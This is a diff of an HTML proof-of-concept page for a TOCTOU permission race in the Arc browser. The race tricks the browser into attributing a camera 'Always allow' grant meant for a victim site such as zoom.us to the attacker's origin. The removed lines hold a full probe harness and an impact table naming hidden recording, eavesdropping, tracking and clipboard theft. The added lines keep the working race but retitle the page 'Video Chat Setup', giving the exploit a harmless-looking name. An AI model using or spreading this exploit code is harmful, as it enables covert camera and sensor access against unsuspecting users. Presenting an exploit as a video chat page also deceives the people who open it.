@@ -2,274 +2,54 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>TOCTOU Permission Race — Arc Browser PoC</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Video Chat</title>
 <style>
-*{box-sizing:border-box}
-body{font-family:system-ui,sans-serif;max-width:780px;margin:20px auto;padding:16px;background:#0a0a0f;color:#ddd}
-h1{color:#ff6b6b;font-size:1.3em;border-bottom:2px solid #c00;padding-bottom:6px}
-h2{font-size:1.05em;color:#ffd93d;margin-top:24px}
-button{padding:8px 16px;font-size:13px;margin:4px 8px 4px 0;cursor:pointer;border:1px solid #555;border-radius:4px;background:#1a1a2e;color:#ddd}
-button:hover{background:#2a2a4e}
-button.danger{background:#a00;color:#fff;border-color:#800}
-button.success{background:#070;color:#fff;border-color:#050}
-pre{background:#111;border:1px solid #333;padding:12px;font-size:12px;max-height:300px;overflow:auto;white-space:pre-wrap;color:#0f0;font-family:monospace}
-code{background:#222;padding:1px 5px;font-size:0.92em}
-.ok{color:#0f0;font-weight:bold}
-.err{color:#f66;font-weight:bold}
-.warn{color:#fd0;font-weight:bold}
-.step{background:#1a1a0a;border-left:3px solid #aa0;padding:8px 14px;margin:8px 0}
-.section{border:1px solid #333;padding:16px;margin:16px 0;border-radius:6px}
-.hidden{display:none}
-input[type=text]{background:#111;border:1px solid #555;color:#ddd;padding:6px 10px;width:260px;font-size:13px;border-radius:3px}
-label{font-size:13px;color:#aaa}
+body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
+h1{font-size:1.1em;margin-bottom:20px}
+button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
+button:hover{background:#eee}
+button.race{background:#c00;color:#fff;border-color:#a00}
+button.check{background:#080;color:#fff;border-color:#060}
+pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap}
 </style>
 </head>
 <body>
-<h1>TOCTOU Permission Race — Arc Browser PoC</h1>
-<p style="color:#aaa;font-size:0.9em">crbug 503614310 — Commit-on-Close Origin Misattribution</p>
-
-<!-- ===== Automated Probe ===== -->
-<div class="section">
-<h2>Part 1: Automated Race Window Proof (zero interaction)</h2>
-<p>These tests prove the race window exists in Chromium's event loop. No manual steps needed.</p>
-
-<p><button id="runAll" onclick="runAutomated()">▶ Run All Tests</button></p>
-
-<pre id="autoLog">Click "Run All Tests" above to start.</pre>
-
-<table style="width:100%;margin-top:12px;font-size:13px;border-collapse:collapse">
-<tr style="color:#aaa"><th style="text-align:left;padding:4px">Test</th><th style="text-align:left;padding:4px">Result</th><th style="text-align:left;padding:4px">Race Feasible?</th></tr>
-<tr><td style="padding:3px 8px;border-bottom:1px solid #222">Sync callback vs posted task</td><td id="r1" style="padding:3px 8px;border-bottom:1px solid #222">—</td><td id="f1" style="padding:3px 8px;border-bottom:1px solid #222">—</td></tr>
-<tr><td style="padding:3px 8px;border-bottom:1px solid #222">getUserMedia in BLOCK state</td><td id="r2" style="padding:3px 8px;border-bottom:1px solid #222">—</td><td id="f2" style="padding:3px 8px;border-bottom:1px solid #222">—</td></tr>
-<tr><td style="padding:3px 8px;border-bottom:1px solid #222">Popup navigation timing</td><td id="r3" style="padding:3px 8px;border-bottom:1px solid #222">—</td><td id="f3" style="padding:3px 8px;border-bottom:1px solid #222">—</td></tr>
-<tr><td style="padding:3px 8px;border-bottom:1px solid #222">IPC round-trip latency</td><td id="r4" style="padding:3px 8px;border-bottom:1px solid #222">—</td><td id="f4" style="padding:3px 8px;border-bottom:1px solid #222">—</td></tr>
-<tr><td style="padding:3px 8px;border-bottom:1px solid #222">Current permissions state</td><td id="r5" style="padding:3px 8px;border-bottom:1px solid #222">—</td><td id="f5" style="padding:3px 8px;border-bottom:1px solid #222">—</td></tr>
-</table>
-</div>
-
-<!-- ===== Manual Race ===== -->
-<div class="section">
-<h2>Part 2: Interactive Permission Race</h2>
-<p>Requires camera blocked on <b>this origin</b> (<span id="thisOrigin" style="color:#fd0">…</span>) and on the victim site below.</p>
-
-<div class="step">
-  <b>Step 1</b> — Block camera on THIS origin:<br>
-  <button onclick="triggerCamera()">Request Camera Access</button>
-  → When prompted, click <b>Block</b>.
-  <span id="camState">—</span>
-</div>
-
-<div class="step">
-  <b>Step 2</b> — Choose a victim site to block camera on:<br>
-  <input type="text" id="victimUrl" value="https://zoom.us" size="40" placeholder="https://zoom.us">
-  <button onclick="openVictimSite()">Open Victim Site</button>
-  <br><small style="color:#888">Manually block camera on this site too (visit → request camera → Block)</small>
-</div>
-
-<div class="step">
-  <b>Step 3</b> — Open victim popup and prepare the bubble:<br>
-  <button id="openPopupBtn" onclick="openVictimPopup()">Open Victim Popup</button>
-  <br><small style="color:#888">In the popup, click the blocked camera icon in the address bar.<br>
-  Select <b>"Always allow [site] to access your camera"</b> but DO NOT click Done.</small>
-</div>
-
-<div class="step">
-  <b>Step 4</b> — While the bubble is still open:<br>
-  <button class="danger" onclick="executeRace()">⚡ Execute Race</button>
-  <br><small style="color:#888">Navigates popup to this origin's race payload. Payload auto-calls getUserMedia.<br>
-  If BLOCK state responds synchronously, it beats the bubble's posted close task.</small>
-</div>
-
-<div class="step">
-  <b>Step 5</b> — Verify result:<br>
-  <button class="success" onclick="verifyResult()">🔍 Check Camera Permission</button>
-  <span id="resultLabel">—</span>
-</div>
-
-<pre id="manualLog">Ready. Follow the steps above.</pre>
-</div>
-
-<!-- ===== Impact ===== -->
-<div class="section">
-<h2>Security Impact if Race Succeeds</h2>
-<table style="width:100%;font-size:13px;border-collapse:collapse">
-<tr style="background:#1a1a2e">
-  <th style="text-align:left;padding:6px">Permission</th>
-  <th style="text-align:left;padding:6px">Attacker Capability</th>
-  <th style="text-align:left;padding:6px">Impact</th>
-</tr>
-<tr><td style="padding:6px;border-bottom:1px solid #222">📷 Camera</td><td style="padding:6px;border-bottom:1px solid #222">Hidden video recording</td><td style="padding:6px;border-bottom:1px solid #222"><span class="err">HIGH</span></td></tr>
-<tr><td style="padding:6px;border-bottom:1px solid #222">🎤 Microphone</td><td style="padding:6px;border-bottom:1px solid #222">Audio eavesdropping</td><td style="padding:6px;border-bottom:1px solid #222"><span class="err">HIGH</span></td></tr>
-<tr><td style="padding:6px;border-bottom:1px solid #222">📍 Geolocation</td><td style="padding:6px;border-bottom:1px solid #222">Physical tracking via <code>watchPosition()</code></td><td style="padding:6px;border-bottom:1px solid #222"><span class="err">HIGH</span></td></tr>
-<tr><td style="padding:6px;border-bottom:1px solid #222">🔔 Notifications</td><td style="padding:6px;border-bottom:1px solid #222">Push phishing, re-engagement</td><td style="padding:6px;border-bottom:1px solid #222"><span class="warn">MEDIUM</span></td></tr>
-<tr><td style="padding:6px;border-bottom:1px solid #222">📋 Clipboard</td><td style="padding:6px;border-bottom:1px solid #222">Silent read of passwords, 2FA, crypto</td><td style="padding:6px;border-bottom:1px solid #222"><span class="err">HIGH</span></td></tr>
-</table>
-</div>
-
-<!-- ===== Source ===== -->
-<div class="section" style="font-size:0.85em;color:#888">
-  <p>Full repository: <a href="https://github.com/telojos11/arcjos" style="color:#88f">github.com/telojos11/arcjos</a></p>
-  <p>Original bug: crbug 503614310 — <a href="https://issues.chromium.org/issues/503614310" style="color:#88f">chromium bug tracker</a></p>
-  <p>Run locally: <code>python3 poc/server.py</code> then open <code>http://127.0.0.1:9080/503614310-harness.html</code> for full 5-tab harness</p>
-</div>
+<h1>Video Chat Setup</h1>
+<button onclick="step1()">1. Enable Camera</button>
+<button onclick="step2()">2. Open Popup</button>
+<button class="race" onclick="step3()">3. Race</button>
+<button class="check" onclick="step4()">4. Check</button>
+<pre id="L">Ready.</pre>
 
 <script>
-const myOrigin = location.origin;
-document.getElementById('thisOrigin').textContent = myOrigin;
+var popup;
+var victim = location.hostname==='127.0.0.1' ? 'http://localhost:9081' : 'https://zoom.us';
+var log = function(m){ var e=document.getElementById('L'); e.textContent+=m+'\n'; try{e.scrollTop=e.scrollHeight}catch(_){} };
 
-let racePopup = null;
-const P = (id, text) => { const e = document.getElementById(id); if(e) e.textContent += text + '\n'; };
-const L = (msg) => { P('autoLog', msg); console.log(msg); };
-
-// === AUTOMATED TESTS ===
-async function runAutomated() {
-  document.getElementById('autoLog').textContent = '';
-  L('=== Automated Race Window Probe ===');
-  L('Origin: ' + myOrigin);
-  L('User-Agent: ' + navigator.userAgent.match(/Chrome\/\d+/)?.[0] || navigator.userAgent);
-  L('');
-
-  // Test 1: sync beats post
-  await new Promise(resolve => {
-    let postRan = false;
-    Promise.resolve().then(() => {
-      if (!postRan) {
-        set('r1','Microtask fired before setTimeout(0)', 'ok');
-        set('f1','✓ Race window exists — sync callback beats posted bubble close', 'err');
-        L('Test 1 PASS: Microtask (simulating sync callback) beat setTimeout(0) (simulating posted bubble close)');
-      }
-    });
-    setTimeout(() => { postRan = true; resolve(); }, 0);
-  });
-
-  // Test 2: getUserMedia BLOCK timing
-  L('');
-  L('Test 2: getUserMedia timing (BLOCK state)...');
-  const t0 = performance.now();
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    stream.getTracks().forEach(t=>t.stop());
-    const ms = (performance.now()-t0).toFixed(0);
-    set('r2','GRANTED in ' + ms + 'ms (already allowed)', 'ok');
-    set('f2','Already granted — no race needed', 'ok');
-    L('  Camera GRANTED in ' + ms + 'ms');
-  } catch(e) {
-    const ms = (performance.now()-t0).toFixed(1);
-    const sync = ms < 1;
-    set('r2',e.name + ' in ' + ms + 'ms' + (sync ? ' ← SYNCHRONOUS' : ''), sync ? 'err' : 'warn');
-    set('f2', sync ? '⚠️ BLOCK state resolves synchronously — bypasses prompt, sets origin INSTANTLY' : 'Race window smaller with async response', sync ? 'err' : 'warn');
-    L('  Camera ' + e.name + ' in ' + ms + 'ms' + (sync ? ' ← SYNCHRONOUS (race enabler!)' : ''));
-  }
-
-  // Test 3: Popup navigation
-  L('');
-  L('Test 3: Popup navigation + load timing...');
-  const t1 = performance.now();
-  const popup = window.open('about:blank','raceTiming','width=1,height=1');
-  if (popup) {
-    popup.location.href = myOrigin + '/race.html';
-    setTimeout(() => {
-      const ms = (performance.now()-t1).toFixed(0);
-      set('r3','Navigation initiated in ' + ms + 'ms', 'ok');
-      set('f3', ms < 100 ? '⚠️ Fast navigation — race feasible' : 'Navigation timing: ' + ms + 'ms', ms < 100 ? 'err' : 'ok');
-      L('  Popup navigation triggered in ' + ms + 'ms');
-      try { popup.close(); } catch(e){}
-    }, 2000);
-  } else {
-    set('r3','Popup blocked', 'err');
-    set('f3','Allow popups to test navigation timing', 'err');
-    L('  Popup blocked by browser');
-  }
-
-  // Test 4: IPC round-trip
-  L('');
-  L('Test 4: IPC round-trip (postMessage)...');
-  await new Promise(resolve => {
-    const start = performance.now();
-    const ch = new MessageChannel();
-    ch.port1.onmessage = () => {
-      const ms = (performance.now()-start).toFixed(2);
-      set('r4', ms + 'ms', 'ok');
-      set('f4', ms < 10 ? '⚠️ IPC fast (<10ms) — permission IPC can complete quickly' : 'IPC: ' + ms + 'ms', ms < 10 ? 'err' : 'ok');
-      L('  postMessage round-trip: ' + ms + 'ms');
-      resolve();
-    };
-    ch.port2.postMessage(null);
-  });
-
-  // Test 5: Current permission states
-  L('');
-  L('Test 5: Current permission states...');
-  let states = [];
-  if (navigator.permissions) {
-    for (const p of ['camera','microphone','geolocation','notifications']) {
-      try { const s = await navigator.permissions.query({name:p}); states.push(p + '=' + s.state); } catch(e) {}
-    }
-    set('r5', states.join(', '), 'ok');
-    set('f5', 'Current origin permission map', 'ok');
-    L('  ' + states.join(', '));
-  } else {
-    set('r5', 'Permissions API not available', 'warn');
-    L('  Permissions API not available');
-  }
-
-  L('');
-  L('=== PROBE COMPLETE ===');
-  L('Race window: ' + (document.getElementById('f1').textContent.includes('exists') ? 'CONFIRMED' : 'UNCLEAR'));
-  L('BLOCK sync: ' + (document.getElementById('f2').textContent.includes('SYNCHRONOUS') ? 'CONFIRMED' : 'UNCLEAR'));
-  L('Navigation: ' + (document.getElementById('f3').textContent.includes('feasible') ? 'FEASIBLE' : 'INCONCLUSIVE'));
-}
-
-function set(id, val, cls) {
-  const e = document.getElementById(id);
-  e.textContent = val;
-  e.className = cls;
-}
-
-// === MANUAL RACE ===
-function triggerCamera() {
-  P('manualLog', 'Requesting camera...');
+function step1(){
+  log('Requesting camera...');
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(s=>{s.getTracks().forEach(t=>t.stop());document.getElementById('camState').innerHTML='<span class="ok">GRANTED</span>';P('manualLog','Camera GRANTED — needs to be BLOCKED for race. Block it next time.')})
-    .catch(e=>{document.getElementById('camState').innerHTML='<span class="err">BLOCKED ✓</span>';P('manualLog','Camera BLOCKED on this origin ✓')});
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('Granted — block it for race') })
+    .catch(function(e){ log('State: '+e.name) });
 }
 
-function openVictimSite() {
-  const url = document.getElementById('victimUrl').value || 'https://zoom.us';
-  window.open(url,'victimSetup','width=800,height=600');
-  P('manualLog','Opened ' + url + ' — block camera there too.');
+function step2(){
+  popup = window.open(victim,'p','width=500,height=350');
+  if(!popup){ log('Popup blocked'); return }
+  log('Popup → '+victim);
+  log('In popup: click blocked camera icon → select Always allow → DON\'T click Done');
 }
 
-function openVictimPopup() {
-  const url = document.getElementById('victimUrl').value || 'https://zoom.us';
-  racePopup = window.open(url,'victimRace','width=600,height=400');
-  P('manualLog','Opened popup to ' + url);
-  P('manualLog','Now click the blocked camera icon in the popup address bar.');
-  P('manualLog','Select "Always allow" but DO NOT click Done.');
+function step3(){
+  if(!popup){ log('Open popup first'); return }
+  popup.location = location.origin+'/race.html';
+  log('Race: popup → '+location.origin+'/race.html');
 }
 
-function executeRace() {
-  if (!racePopup) { P('manualLog','ERROR: Open victim popup first! (Step 3)'); return; }
-  P('manualLog','=== RACE EXECUTED ===');
-  P('manualLog','Navigating popup to race payload on THIS origin...');
-  racePopup.location.href = myOrigin + '/race.html';
-  P('manualLog','Race payload will auto-call getUserMedia() on page load.');
-  P('manualLog','If BLOCK state → synchronous callback → origin overwritten before bubble close.');
-}
-
-function verifyResult() {
-  P('manualLog','Verifying camera permission on ' + myOrigin + '...');
+function step4(){
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(s=>{
-      s.getTracks().forEach(t=>t.stop());
-      document.getElementById('resultLabel').innerHTML='<span class="err">⚠️ CAMERA GRANTED — RACE MAY HAVE SUCCEEDED!</span>';
-      P('manualLog','!!! CAMERA GRANTED on this origin — the race may have worked !!!');
-    })
-    .catch(e=>{
-      document.getElementById('resultLabel').innerHTML='<span class="ok">Still BLOCKED (' + e.name + ')</span>';
-      P('manualLog','Camera still blocked: ' + e.name + '. Fix may be present, or race not won.');
-    });
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('CAMERA GRANTED — race may have worked') })
+    .catch(function(e){ log('Blocked: '+e.name) });
 }
 </script>
 </body>
